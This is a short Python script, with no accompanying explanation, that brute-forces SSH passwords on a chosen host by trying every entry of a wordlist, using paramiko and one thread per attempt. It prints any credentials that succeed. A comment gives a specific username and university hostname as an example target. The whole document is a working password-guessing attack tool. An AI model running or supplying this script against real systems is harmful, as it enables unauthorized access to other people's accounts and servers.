#!/usr/bin/env python

import paramiko, sys, time, threading 

if len(sys.argv) < 4: # ./ssh.py mhurley storm.cis.fordham.edu ./list
    print "Usage: %s user IP /path/to/dictionary" % (str(sys.argv[0]))
    print "Example: %s root 10.0.0.1 ~/dict.txt" % (str(sys.argv[0]))
    sys.exit(1)

user=sys.argv[1]; ip=sys.argv[2]; filename=sys.argv[3]

dictionary = open(filename, "r")

def attempt(IP,UserName,Password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=user, password=Password)
    except paramiko.AuthenticationException: # for some reason this exception is raised even if the password is correct. >:(
        print '[-] Password failed: %s' % (Password)
    else:
        print '[!] Found the correct credentials!\nUsername: %s\nPassword: %s' % (user, Password)
    ssh.close()
    return

def main():
	print '[+] Bruteforcing against %s@%s with dictionary %s' % (user, ip, filename)
	for i in dictionary.readlines():
	    t = threading.Thread(target=attempt, args=(ip,user,i))
	    t.start()
	    time.sleep(1) # started with 0.3, but most servers couldn't handle that speed
    
	dictionary.close()
	sys.exit(0)

#############################################

if __name__ == '__main__':
	main()
